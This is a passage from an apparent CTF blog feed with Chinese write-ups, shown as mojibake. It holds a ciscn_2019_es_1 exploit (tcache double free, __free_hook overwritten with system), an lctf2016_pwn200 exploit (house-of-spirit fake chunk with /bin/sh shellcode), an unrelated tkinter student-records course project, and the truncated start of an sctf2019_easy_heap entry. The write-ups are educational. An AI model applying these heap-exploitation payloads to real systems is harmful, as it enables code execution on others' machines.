†çš„åœ°å€ï¼Œè€Œä¸‹ä¸€ä¸ªå †æ­£æ˜¯æˆ‘ä»¬addå‡½æ•°çš„è¿‡ç¨‹ï¼Œåœ¨0x000055ac61f846c0è¿™ä¸ªåœ°å€å†™å…¥çš„æ˜¯free-hookçš„åœ°å€ï¼Œä½†æ˜¯å®ƒä¾ç„¶è¿˜æ˜¯åœ¨biné“¾ä¸­çš„ï¼Œè¿™å°±å¾ˆä¸è§£ï¼Œæ˜æ˜å·²ç»è¢«ä½¿ç”¨äº†ï¼Œè¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free-hookï¼Œæˆ‘ä»¬å†malloc"><a href="#è¿™é‡Œä¹Ÿè®¸æ˜¯tachebinçš„æœºåˆ¶ï¼Œå†æ¬¡mallocæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªå †è®°å½•ä¸‹ä¸€ä¸ªå †çš„åœ°å€ï¼Œè€Œä¸‹ä¸€ä¸ªå †æ­£æ˜¯æˆ‘ä»¬addå‡½æ•°çš„è¿‡ç¨‹ï¼Œåœ¨0x000055ac61f846c0è¿™ä¸ªåœ°å€å†™å…¥çš„æ˜¯free-hookçš„åœ°å€ï¼Œä½†æ˜¯å®ƒä¾ç„¶è¿˜æ˜¯åœ¨biné“¾ä¸­çš„ï¼Œè¿™å°±å¾ˆä¸è§£ï¼Œæ˜æ˜å·²ç»è¢«ä½¿ç”¨äº†ï¼Œè¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free-hookï¼Œæˆ‘ä»¬å†malloc" class="headerlink" title="è¿™é‡Œä¹Ÿè®¸æ˜¯tachebinçš„æœºåˆ¶ï¼Œå†æ¬¡mallocæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªå †è®°å½•ä¸‹ä¸€ä¸ªå †çš„åœ°å€ï¼Œè€Œä¸‹ä¸€ä¸ªå †æ­£æ˜¯æˆ‘ä»¬addå‡½æ•°çš„è¿‡ç¨‹ï¼Œåœ¨0x000055ac61f846c0è¿™ä¸ªåœ°å€å†™å…¥çš„æ˜¯free_hookçš„åœ°å€ï¼Œä½†æ˜¯å®ƒä¾ç„¶è¿˜æ˜¯åœ¨biné“¾ä¸­çš„ï¼Œè¿™å°±å¾ˆä¸è§£ï¼Œæ˜æ˜å·²ç»è¢«ä½¿ç”¨äº†ï¼Œè¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†malloc"></a>è¿™é‡Œä¹Ÿè®¸æ˜¯tachebinçš„æœºåˆ¶ï¼Œå†æ¬¡mallocæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªå †è®°å½•ä¸‹ä¸€ä¸ªå †çš„åœ°å€ï¼Œè€Œä¸‹ä¸€ä¸ªå †æ­£æ˜¯æˆ‘ä»¬addå‡½æ•°çš„è¿‡ç¨‹ï¼Œåœ¨0x000055ac61f846c0è¿™ä¸ªåœ°å€å†™å…¥çš„æ˜¯free_hookçš„åœ°å€ï¼Œä½†æ˜¯å®ƒä¾ç„¶è¿˜æ˜¯åœ¨biné“¾ä¸­çš„ï¼Œè¿™å°±å¾ˆä¸è§£ï¼Œæ˜æ˜å·²ç»è¢«ä½¿ç”¨äº†ï¼Œè¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p><h4 id="è¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free-hookï¼Œæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±èƒ½æŠŠfree-hookå‡½æ•°çš„åœ°å€å†…å®¹æ”¹æˆsystemå‡½æ•°çš„åœ°å€-è€Œéƒ½åŒaddå‡½æ•°ä¸€æ ·æ­£å¸¸mollcï¼Œå‚æ•°bin-shæ”¾åœ¨å †3"><a href="#è¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free-hookï¼Œæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±èƒ½æŠŠfree-hookå‡½æ•°çš„åœ°å€å†…å®¹æ”¹æˆsystemå‡½æ•°çš„åœ°å€-è€Œéƒ½åŒaddå‡½æ•°ä¸€æ ·æ­£å¸¸mollcï¼Œå‚æ•°bin-shæ”¾åœ¨å †3" class="headerlink" title="è¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±èƒ½æŠŠfree_hookå‡½æ•°çš„åœ°å€å†…å®¹æ”¹æˆsystemå‡½æ•°çš„åœ°å€,è€Œéƒ½åŒaddå‡½æ•°ä¸€æ ·æ­£å¸¸mollcï¼Œå‚æ•°bin/shæ”¾åœ¨å †3"></a>è¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±èƒ½æŠŠfree_hookå‡½æ•°çš„åœ°å€å†…å®¹æ”¹æˆsystemå‡½æ•°çš„åœ°å€,è€Œéƒ½åŒaddå‡½æ•°ä¸€æ ·æ­£å¸¸mollcï¼Œå‚æ•°bin/shæ”¾åœ¨å †3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28022)p=process(&quot;./ciscn_2019_es_1&quot;)context.log_level=&quot;debug&quot;elf=ELF(&quot;./ciscn_2019_es_1&quot;)libc=ELF(&quot;./libc-2.27.so&quot;)def add(size,name):    p.recvuntil(&quot;choice:&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;name&quot;)    p.sendline(str(int(size)))    p.recvuntil(&quot;name:&quot;)    p.sendline(name)    p.recvuntil(&quot;call&quot;)    p.sendline(name)def show(dex):    p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;)    p.sendlineafter(&quot;index:&quot;,str(dex))  def delete(dex):    p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;)    p.sendlineafter(&quot;index:\n&quot;,str(dex)) add(0x410,&quot;AAAA&quot;)add(0x20,&quot;AAAA&quot;)add(0x20,&quot;bin/sh&quot;)delete(0)show(0)malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]system_addr = base_addr + libc.symbols[&#39;system&#39;]delete(1)delete(1)gdb.attach(p)sleep(1)add(0x20,p64(free_hook))add(0x20,&#39;MMMM&#39;)add(0x20,p64(system_addr))delete(2)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200</title>
      <link href="/2024/01/14/lctf2016_pwn200/"/>
      <url>/2024/01/14/lctf2016_pwn200/</url>
      
        <content type="html"><![CDATA[<h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="ä¸€é“æœ‰ç‚¹éš¾çš„å †é¢˜"><a href="#ä¸€é“æœ‰ç‚¹éš¾çš„å †é¢˜" class="headerlink" title="ä¸€é“æœ‰ç‚¹éš¾çš„å †é¢˜"></a>ä¸€é“æœ‰ç‚¹éš¾çš„å †é¢˜</h4><h4 id="è¿™æ˜¯ä¸»å‡½æ•°çš„ç»“æ„ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ»¡0x40æ—¶èƒ½å¤ŸæŠŠä¸»å‡½æ•°çš„ebpçš„åœ°å€æ³„éœ²å‡ºæ¥"><a href="#è¿™æ˜¯ä¸»å‡½æ•°çš„ç»“æ„ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ»¡0x40æ—¶èƒ½å¤ŸæŠŠä¸»å‡½æ•°çš„ebpçš„åœ°å€æ³„éœ²å‡ºæ¥" class="headerlink" title="è¿™æ˜¯ä¸»å‡½æ•°çš„ç»“æ„ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ»¡0x40æ—¶èƒ½å¤ŸæŠŠä¸»å‡½æ•°çš„ebpçš„åœ°å€æ³„éœ²å‡ºæ¥"></a>è¿™æ˜¯ä¸»å‡½æ•°çš„ç»“æ„ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ»¡0x40æ—¶èƒ½å¤ŸæŠŠä¸»å‡½æ•°çš„ebpçš„åœ°å€æ³„éœ²å‡ºæ¥</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p><h4 id="ä¸‹é¢å°açš„æœ«å°¾çš„rbpå¯„å­˜å™¨å­˜ç€ä¸»å‡½æ•°çš„rbp"><a href="#ä¸‹é¢å°açš„æœ«å°¾çš„rbpå¯„å­˜å™¨å­˜ç€ä¸»å‡½æ•°çš„rbp" class="headerlink" title="ä¸‹é¢å°açš„æœ«å°¾çš„rbpå¯„å­˜å™¨å­˜ç€ä¸»å‡½æ•°çš„rbp"></a>ä¸‹é¢å°açš„æœ«å°¾çš„rbpå¯„å­˜å™¨å­˜ç€ä¸»å‡½æ•°çš„rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p><h4 id="åé¢è¿˜è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆå¸§ç¦»å¾—ä¸è¿œï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ„é€ æˆ‘ä»¬çš„fakechunk-è¿˜æœ‰æˆ‘ä»¬çš„shellcode"><a href="#åé¢è¿˜è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆå¸§ç¦»å¾—ä¸è¿œï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ„é€ æˆ‘ä»¬çš„fakechunk-è¿˜æœ‰æˆ‘ä»¬çš„shellcode" class="headerlink" title="åé¢è¿˜è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆå¸§ç¦»å¾—ä¸è¿œï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ„é€ æˆ‘ä»¬çš„fakechunk,è¿˜æœ‰æˆ‘ä»¬çš„shellcode"></a>åé¢è¿˜è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆå¸§ç¦»å¾—ä¸è¿œï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ„é€ æˆ‘ä»¬çš„fakechunk,è¿˜æœ‰æˆ‘ä»¬çš„shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p><h4 id="shellcodeç¬¬ä¸€ä¸ªå¾—æ˜¯â€™-x00â€™é˜²æ­¢å¤åˆ¶è¿‡å»ï¼Œé€ æˆå½±å“"><a href="#shellcodeç¬¬ä¸€ä¸ªå¾—æ˜¯â€™-x00â€™é˜²æ­¢å¤åˆ¶è¿‡å»ï¼Œé€ æˆå½±å“" class="headerlink" title="shellcodeç¬¬ä¸€ä¸ªå¾—æ˜¯â€™\x00â€™é˜²æ­¢å¤åˆ¶è¿‡å»ï¼Œé€ æˆå½±å“"></a>shellcodeç¬¬ä¸€ä¸ªå¾—æ˜¯â€™\x00â€™é˜²æ­¢å¤åˆ¶è¿‡å»ï¼Œé€ æˆå½±å“</h4><h4 id="ç”³è¯·å¾—åˆ°å¾—å †çš„åœ°å€å’Œç»™è¿‡å»çš„ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯æ„é€ çš„æ ˆçš„ç»“æ„"><a href="#ç”³è¯·å¾—åˆ°å¾—å †çš„åœ°å€å’Œç»™è¿‡å»çš„ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯æ„é€ çš„æ ˆçš„ç»“æ„" class="headerlink" title="ç”³è¯·å¾—åˆ°å¾—å †çš„åœ°å€å’Œç»™è¿‡å»çš„ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯æ„é€ çš„æ ˆçš„ç»“æ„"></a>ç”³è¯·å¾—åˆ°å¾—å †çš„åœ°å€å’Œç»™è¿‡å»çš„ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯æ„é€ çš„æ ˆçš„ç»“æ„</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p><p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p><h4 id="ç„¶åptræŒ‡é’ˆçš„å€¼è¢«è¦†ç›–æˆæ ˆä¸Šçš„ï¼Œç­‰æˆ‘ä»¬freeå†mallocçš„æ—¶å€™å°±èƒ½ç”³è¯·åˆ°è¿™ï¼Œä½†æ˜¯å¤§å°å¾—æ˜¯0x30ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„fakechunkçš„å¤§å°æ˜¯0x40çš„å¤§å°ï¼Œè¿™æ ·æ‰èƒ½mallocåˆ°æˆ‘ä»¬çš„æ ˆä¸Šï¼Œä»è€Œè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè€Œè¿”å›åœ°å€å¾—å†™æˆshellcodeå¼€å§‹çš„åœ°å€ã€‚"><a href="#ç„¶åptræŒ‡é’ˆçš„å€¼è¢«è¦†ç›–æˆæ ˆä¸Šçš„ï¼Œç­‰æˆ‘ä»¬freeå†mallocçš„æ—¶å€™å°±èƒ½ç”³è¯·åˆ°è¿™ï¼Œä½†æ˜¯å¤§å°å¾—æ˜¯0x30ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„fakechunkçš„å¤§å°æ˜¯0x40çš„å¤§å°ï¼Œè¿™æ ·æ‰èƒ½mallocåˆ°æˆ‘ä»¬çš„æ ˆä¸Šï¼Œä»è€Œè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè€Œè¿”å›åœ°å€å¾—å†™æˆshellcodeå¼€å§‹çš„åœ°å€ã€‚" class="headerlink" title="ç„¶åptræŒ‡é’ˆçš„å€¼è¢«è¦†ç›–æˆæ ˆä¸Šçš„ï¼Œç­‰æˆ‘ä»¬freeå†mallocçš„æ—¶å€™å°±èƒ½ç”³è¯·åˆ°è¿™ï¼Œä½†æ˜¯å¤§å°å¾—æ˜¯0x30ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„fakechunkçš„å¤§å°æ˜¯0x40çš„å¤§å°ï¼Œè¿™æ ·æ‰èƒ½mallocåˆ°æˆ‘ä»¬çš„æ ˆä¸Šï¼Œä»è€Œè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè€Œè¿”å›åœ°å€å¾—å†™æˆshellcodeå¼€å§‹çš„åœ°å€ã€‚"></a>ç„¶åptræŒ‡é’ˆçš„å€¼è¢«è¦†ç›–æˆæ ˆä¸Šçš„ï¼Œç­‰æˆ‘ä»¬freeå†mallocçš„æ—¶å€™å°±èƒ½ç”³è¯·åˆ°è¿™ï¼Œä½†æ˜¯å¤§å°å¾—æ˜¯0x30ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„fakechunkçš„å¤§å°æ˜¯0x40çš„å¤§å°ï¼Œè¿™æ ·æ‰èƒ½mallocåˆ°æˆ‘ä»¬çš„æ ˆä¸Šï¼Œä»è€Œè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè€Œè¿”å›åœ°å€å¾—å†™æˆshellcodeå¼€å§‹çš„åœ°å€ã€‚</h4><h4 id="shellcodeçš„ç»“æ„åº”è¯¥å†™å‡ºè¿™æ ·çš„ç»“æ„ã€‚"><a href="#shellcodeçš„ç»“æ„åº”è¯¥å†™å‡ºè¿™æ ·çš„ç»“æ„ã€‚" class="headerlink" title="shellcodeçš„ç»“æ„åº”è¯¥å†™å‡ºè¿™æ ·çš„ç»“æ„ã€‚"></a>shellcodeçš„ç»“æ„åº”è¯¥å†™å‡ºè¿™æ ·çš„ç»“æ„ã€‚</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p><pre><code class="lang-py">payload=3*p64(0)+p64(rbp-0xc0+1)</code></pre><h4 id="å†æ¬¡ç”³è¯·è¦†ç›–æ‰è¿”å›åœ°å€ï¼Œæœ€åç¨‹åºè¿”å›çš„æ—¶å€™ä¼šæ‰§è¡Œshellcode"><a href="#å†æ¬¡ç”³è¯·è¦†ç›–æ‰è¿”å›åœ°å€ï¼Œæœ€åç¨‹åºè¿”å›çš„æ—¶å€™ä¼šæ‰§è¡Œshellcode" class="headerlink" title="å†æ¬¡ç”³è¯·è¦†ç›–æ‰è¿”å›åœ°å€ï¼Œæœ€åç¨‹åºè¿”å›çš„æ—¶å€™ä¼šæ‰§è¡Œshellcode"></a>å†æ¬¡ç”³è¯·è¦†ç›–æ‰è¿”å›åœ°å€ï¼Œæœ€åç¨‹åºè¿”å›çš„æ—¶å€™ä¼šæ‰§è¡Œshellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,28868)p=process(&quot;./pwn200&quot;)context.log_level=&quot;debug&quot;payload=&#39;a&#39;*0x30p.sendafter(&#39;u?&#39;,payload)p.recvuntil(&#39;a&#39;*0x30)rbp=u64(p.recv(6).ljust(8,&#39;\x00&#39;))print(hex(rbp))shellcode=&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;shellcode+= &quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;shellcode += &quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\x00&#39;)  #gouzhao fakebchunkpayload+=p64(rbp-0x90)p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;)print(hex(rbp-0x90))p.sendlineafter(&#39;money~&#39;,payload)p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;)#p.recvuntil(&#39;\n&#39;)gdb.attach(p)sleep(1)p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;)p.sendlineafter(&#39;long?&#39;,&#39;48&#39;)payload=3*p64(0)+p64(rbp-0xc0+1)p.sendlineafter(&#39;money : &#39;,payload)p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonè¯¾è®¾</title>
      <link href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/"/>
      <url>/2023/12/25/python%E8%AF%BE%E8%AE%BE/</url>
      
        <content type="html"><![CDATA[<pre><code class="lang-py">import tkinter as tkfrom tkinter import messagebox, simpledialogimport jsonimport reimport osSTUDENT_FILE = &#39;students.json&#39;def load_students():    if not os.path.exists(STUDENT_FILE):        return []    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:        return json.load(file)def save_students(students):    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:        json.dump(students, file, ensure_ascii=False, indent=2)def show_students(students):    sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;])  # æŒ‰å­¦å·æ’åº    students_text = &quot;&quot;    for student in sorted_students:        students_text += f&quot;å­¦å·: &#123;student[&#39;id&#39;]&#125;\n&quot;        students_text += f&quot;å§“å: &#123;student[&#39;name&#39;]&#125;\n&quot;        students_text += f&quot;å¹´é¾„: &#123;student[&#39;age&#39;]&#125;\n&quot;        students_text += f&quot;æ€§åˆ«: &#123;student[&#39;gender&#39;]&#125;\n\n&quot;    return students_textdef validate_id(student_id):    return bool(student_id.strip())def add_student(students):    dialog = tk.Toplevel()    dialog.title(&quot;æ·»åŠ å­¦ç”Ÿä¿¡æ¯&quot;)    dialog.geometry(&quot;250x200+900+400&quot;)    tk.Label(dialog, text=&quot;å­¦å·ï¼š&quot;).grid(row=0, column=0, padx=10, pady=5)    id_var = tk.StringVar()    tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;å§“åï¼š&quot;).grid(row=1, column=0, padx=10, pady=5)    name_var = tk.StringVar()    tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;å¹´é¾„ï¼š&quot;).grid(row=2, column=0, padx=10, pady=5)    age_var = tk.StringVar()    tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)    tk.Label(dialog, text=&quot;æ€§åˆ«ï¼š&quot;).grid(row=3, column=0, padx=10, pady=5)    gender_var = tk.StringVar()    gender_var.set(&quot;ç”·&quot;)    gender_menu = tk.OptionMenu(dialog, gender_var, &quot;ç”·&quot;, &quot;å¥³&quot;)    gender_menu.grid(row=3, column=1, padx=10, pady=5)    def add_student_action():        student_info = &#123;            &#39;id&#39;: id_var.get(),            &#39;name&#39;: name_var.get(),            &#39;age&#39;: age_var.get(),            &#39;gender&#39;: gender_var.get()        &#125;        if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]):            messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;)            return        if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students):            messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·å·²å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;)            return        students.append(student_info)        messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯æ·»åŠ æˆåŠŸï¼&quot;)        dialog.destroy()    add_button = tk.Button(dialog, text=&quot;æ·»åŠ &quot;, command=add_student_action)    add_button.grid(row=4, columnspan=2, pady=10)def edit_student(students):    student_id = simpledialog.askstring(&quot;è¾“å…¥&quot;, &quot;è¯·è¾“å…¥è¦ç¼–è¾‘çš„å­¦å·ï¼š&quot;)    if not student_id or not validate_id(student_id):        messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;)        return    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)    if student:        messagebox.showinfo(&quot;ä¿¡æ¯&quot;, f&quot;å­¦å·: &#123;student[&#39;id&#39;]&#125;\nå§“å: &#123;student[&#39;name&#39;]&#125;\nå¹´é¾„: &#123;student[&#39;age&#39;]&#125;\næ€§åˆ«: &#123;student[&#39;gender&#39;]&#125;&quot;)        dialog = tk.Toplevel()        dialog.title(&quot;ç¼–è¾‘å­¦ç”Ÿä¿¡æ¯&quot;)        dialog.geometry(&quot;250x200+900+400&quot;)        tk.Label(dialog, text=&quot;å§“åï¼š&quot;).grid(row=1, column=0, padx=10, pady=5)        name_var = tk.StringVar(value=student[&#39;name&#39;])        tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)        tk.Label(dialog, text=&quot;å¹´é¾„ï¼š&quot;).grid(row=2, column=0, padx=10, pady=5)        age_var = tk.StringVar(value=str(student[&#39;age&#39;]))        tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)        tk.Label(dialog, text=&quot;æ€§åˆ«ï¼š&quot;).grid(row=3, column=0, padx=10, pady=5)        gender_var = tk.StringVar(value=student[&#39;gender&#39;])        gender_menu = tk.OptionMenu(dialog, gender_var, &quot;ç”·&quot;, &quot;å¥³&quot;)        gender_menu.grid(row=3, column=1, padx=10, pady=5)        def edit_student_action():            student[&#39;name&#39;] = name_var.get()            student[&#39;age&#39;] = int(age_var.get())            student[&#39;gender&#39;] = gender_var.get()            messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯ç¼–è¾‘æˆåŠŸï¼&quot;)            dialog.destroy()        edit_button = tk.Button(dialog, text=&quot;ç¼–è¾‘&quot;, command=edit_student_action)        edit_button.grid(row=4, columnspan=2, pady=10)    else:        messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;æœªæ‰¾åˆ°è¯¥å­¦ç”Ÿä¿¡æ¯ã€‚&quot;)def delete_student(students):    student_id = simpledialog.askstring(&quot;è¾“å…¥&quot;, &quot;è¯·è¾“å…¥è¦åˆ é™¤çš„å­¦å·ï¼š&quot;)    if not student_id or not validate_id(student_id):        messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;)        return    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)    if student:        students.remove(student)        messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯åˆ é™¤æˆåŠŸï¼&quot;)    else:        messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;æœªæ‰¾åˆ°è¯¥å­¦ç”Ÿä¿¡æ¯ã€‚&quot;)def main():    root = tk.Tk()    root.title(&quot;å­¦ç”Ÿä¿¡æ¯ç®¡ç†ç³»ç»Ÿ&quot;)    students = load_students()    window_width = 800    window_height = 500    screen_width = root.winfo_screenwidth()    screen_height = root.winfo_screenheight()    x_position = (screen_width - window_width) // 2    y_position = (screen_height - window_height) // 2    root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;)    def show_students_command():        students_text = show_students(students)        messagebox.showinfo(&quot;å­¦ç”Ÿä¿¡æ¯&quot;, students_text)    def add_student_command():        add_student(students)    def delete_student_command():        delete_student(students)    def edit_student_command():        edit_student(students)    def save_and_exit():        save_students(students)        root.destroy()    show_students_button = tk.Button(root, text=&quot;æ˜¾ç¤ºæ‰€æœ‰å­¦ç”Ÿä¿¡æ¯&quot;, command=show_students_command)    show_students_button.pack()    add_student_button = tk.Button(root, text=&quot;æ·»åŠ å­¦ç”Ÿä¿¡æ¯&quot;, command=add_student_command)    add_student_button.pack()    delete_student_button = tk.Button(root, text=&quot;åˆ é™¤å­¦ç”Ÿä¿¡æ¯&quot;, command=delete_student_command)    delete_student_button.pack()    edit_student_button = tk.Button(root, text=&quot;ç¼–è¾‘å­¦ç”Ÿä¿¡æ¯&quot;, command=edit_student_command)    edit_student_button.pack()    exit_button = tk.Button(root, text=&quot;ä¿å­˜å¹¶é€€å‡º&quot;, command=save_and_exit)    exit_button.pack()    root.mainloop()if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sctf2019_easy_heap</title>
      <link href="/2023/12/06/sctf2019-easy-heap/"/>
      <url>/2023/12/06/sctf2019-easy-heap/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€"><a href="#ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€" class="headerlink" title="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€"></a>ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€</h5><h5 id="è°ƒç”¨äº†mmapå‡½æ•°ï¼ŒæŠŠ0xFFFFFFF000çš„åœ°å€æ˜ å°„åˆ°å†…å­˜ä¸­æŸä¸ªåœ°å€ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é“é¢˜å¾—ç”¨shellcodeæ¥åšï¼Œè¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯è¿è¡Œï¼Œåé¢è¦ç”¨"><a href="#è°ƒç”¨äº†mmapå‡½æ•°ï¼ŒæŠŠ0xFFFFFFF000çš„åœ°å€æ˜ å°„åˆ°å†…å­˜ä¸­æŸä¸ªåœ°å€ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é“é¢˜å¾—ç”¨shellcodeæ¥åšï¼Œè¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯è¿è¡Œï¼Œåé¢è¦ç”¨" class="headerlink" title="è°ƒç”¨äº†mmapå‡½æ•°ï¼ŒæŠŠ0xFFFFFFF000çš„åœ°å€æ˜ å°„åˆ°å†…å­˜ä¸­æŸä¸ªåœ°å€ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é“é¢˜å¾—ç”¨shellcodeæ¥åšï¼Œè¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯è¿è¡Œï¼Œåé¢è¦ç”¨"></a>è°ƒç”¨äº†mmapå‡½æ•°ï¼ŒæŠŠ0xFFFFFFF000çš„åœ°å€æ˜ 